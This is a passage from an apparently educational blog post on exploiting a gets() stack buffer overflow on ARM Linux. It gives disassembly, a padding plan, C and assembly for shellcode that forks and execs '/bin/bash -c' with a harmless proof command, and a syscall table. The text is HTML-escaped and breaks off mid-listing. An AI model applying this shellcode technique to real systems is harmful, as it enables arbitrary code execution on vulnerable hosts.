-   &lt;span class=&quot;mh&quot;&gt;0x10424&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x10428&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;str&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x1042c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;str&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4c&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x10430&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x44&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x10434&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x10438&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;bl&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-
-   &lt;span class=&quot;mh&quot;&gt;0x1043c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x10440&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
-   &lt;span class=&quot;mh&quot;&gt;0x10444&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;pop&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The plan is to overflow the buffer with 0x44 bytes of padding, then 4
-bytes with the first return address.&lt;/p&gt;
-
-&lt;p&gt;Nothing new. But the fun is just about to begin…&lt;/p&gt;
-
-&lt;h2 id=&quot;planning-the-eggexploit&quot;&gt;Planning the egg/exploit&lt;/h2&gt;
-
-&lt;p&gt;We want something standard but slightly fancy:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;spawn a shell an run an arbitrary command&lt;/li&gt;
-  &lt;li&gt;wait for the spawned process to finish&lt;/li&gt;
-  &lt;li&gt;exit the program&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;This translates to the following C code:&lt;/p&gt;
-
-&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;unistd.h&amp;gt;
-&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;pid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;child&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fork&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;child&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;c1&quot;&gt;// child&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;echo 'pwn!' &amp;gt; pwned_proof&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;child&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;c1&quot;&gt;// parent&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;wait4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;child&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-    &lt;span class=&quot;c1&quot;&gt;// catch all exit&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;exit_group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The last &lt;code class=&quot;highlighter-rouge&quot;&gt;exit_group&lt;/code&gt; is a catch all: if &lt;code class=&quot;highlighter-rouge&quot;&gt;fork&lt;/code&gt; fails or &lt;code class=&quot;highlighter-rouge&quot;&gt;execve&lt;/code&gt; fails
-we want to have a deterministic output. The same for the parent process
-after &lt;code class=&quot;highlighter-rouge&quot;&gt;wait4&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;syscalls&quot;&gt;Syscalls&lt;/h2&gt;
-
-&lt;p&gt;&lt;label for=&quot;mn-72ba81e919d274b14590783257f58039&quot; class=&quot;margin-toggle&quot;&gt; ⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mn-72ba81e919d274b14590783257f58039&quot; class=&quot;margin-toggle&quot; /&gt;&lt;span class=&quot;marginnote&quot;&gt;References: &lt;a href=&quot;https://syscalls.w3challs.com/?arch=arm_strong&quot;&gt;w3challs&lt;/a&gt;
-and
-&lt;a href=&quot;https://github.com/torvalds/linux/blob/v4.17/arch/arm/tools/syscall.tbl&quot;&gt;Linux kernel&lt;/a&gt;
- &lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;This is a summary of the syscalls’ numbers and arguments:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;            r7      r0      r1      r2      r3
-syscall     num     arg1    arg2    arg3    argv4
-fork        0x02
-execve      0x0b    &quot;/bi..&quot; argv    envp
-wait4       0x72    pid     NULL    0       NULL
-exit_group  0xf8    num
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;argv&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;envp&lt;/code&gt;, are arrays of pointers with a
-pointer to &lt;code class=&quot;highlighter-rouge&quot;&gt;NULL&lt;/code&gt; marking the end of the array.&lt;/p&gt;
-
-&lt;p&gt;In Linux it is possible to pass a &lt;code class=&quot;highlighter-rouge&quot;&gt;NULL&lt;/code&gt; instead an array with a single
-pointer to &lt;code class=&quot;highlighter-rouge&quot;&gt;NULL&lt;/code&gt;. This could be used for &lt;code class=&quot;highlighter-rouge&quot;&gt;envp&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;However:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;On Linux, &lt;code class=&quot;highlighter-rouge&quot;&gt;argv&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;envp&lt;/code&gt; can be specified as &lt;code class=&quot;highlighter-rouge&quot;&gt;NULL&lt;/code&gt;.  In both cases,
-this has the same effect as specifying  the  argument
-as  a  pointer to a list containing a single null pointer.
-&lt;strong&gt;Do not take advantage of this nonstandard and nonportable misfeature!&lt;/strong&gt;
-On many other UNIX systems, specifying &lt;code class=&quot;highlighter-rouge&quot;&gt;argv&lt;/code&gt;
-as NULL will result in an  error  (&lt;code class=&quot;highlighter-rouge&quot;&gt;EFAULT&lt;/code&gt;). &lt;em&gt;Some&lt;/em&gt;
-other UNIX systems treat the &lt;code class=&quot;highlighter-rouge&quot;&gt;envp==NULL&lt;/code&gt; case the same as Linux.
-&lt;cite class=&quot;epigraph&quot;&gt;&lt;a href=&quot;https://man7.org/linux/man-pages/man2/execve.2.html&quot;&gt;man execve(2)&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;No problem! We can design a single array in the stack to fulfill both:&lt;/p&gt;
-
-&lt;figure&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;object align=&quot;middle&quot; data=&quot;/book-of-gehn/uml/ed64ad6ce4e7162edd7dbf8ce8e80e471c7ac9aa.svg&quot; type=&quot;image/svg+xml&quot;&gt;&lt;/object&gt;&lt;/figure&gt;
-
-&lt;p&gt;In assembly this translates to:&lt;/p&gt;
-
-&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;              &lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;; &amp;amp;argv[3]&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Largv2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Largv1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Largv0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;; &amp;amp;argv[0]&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;But why &lt;code class=&quot;highlighter-rouge&quot;&gt;add&lt;/code&gt; and not &lt;code class=&quot;highlighter-rouge&quot;&gt;mov&lt;/code&gt;?&lt;/p&gt;
-
-&lt;h2 id=&quot;position-independent-code&quot;&gt;Position independent code&lt;/h2&gt;
-
-&lt;p&gt;The exploit will be loaded in a piece of executable memory but we cannot
-know &lt;em&gt;a priori&lt;/em&gt; where.&lt;/p&gt;
-
-&lt;p&gt;Therefore, branches and addresses &lt;strong&gt;must&lt;/strong&gt; be &lt;em&gt;relative&lt;/em&gt; to the program
-counter.&lt;/p&gt;
-
-&lt;p&gt;We cannot just say &lt;code class=&quot;highlighter-rouge&quot;&gt;mov r2, label&lt;/code&gt; as we will hardcoding the address of
-&lt;code class=&quot;highlighter-rouge&quot;&gt;label&lt;/code&gt;; we need to use &lt;code class=&quot;highlighter-rouge&quot;&gt;add&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;pc&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;00000020&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Lchild&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;e3a03000&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;e28f204c&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;76&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;; 0x4c  argv2&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;e28f1044&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;68&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;; 0x44  argv1&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;e28f0034&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;; 0x34  argv0&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;e92d000f&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;e28d1000&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;e28d200c&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;e3a0700b&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;
-  &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;ef000000&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;svc&lt;/span&gt;     &lt;span class=&quot;mh&quot;&gt;0x00000000&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;....&lt;/span&gt;            &lt;span class=&quot;p&quot;&gt;....&lt;/span&gt;
-
-&lt;span class=&quot;mi&quot;&gt;00000068&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Largv0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;....&lt;/span&gt;            &lt;span class=&quot;p&quot;&gt;....&lt;/span&gt;
-&lt;span class=&quot;mi&quot;&gt;00000074&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Largv1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;....&lt;/span&gt;            &lt;span class=&quot;p&quot;&gt;....&lt;/span&gt;
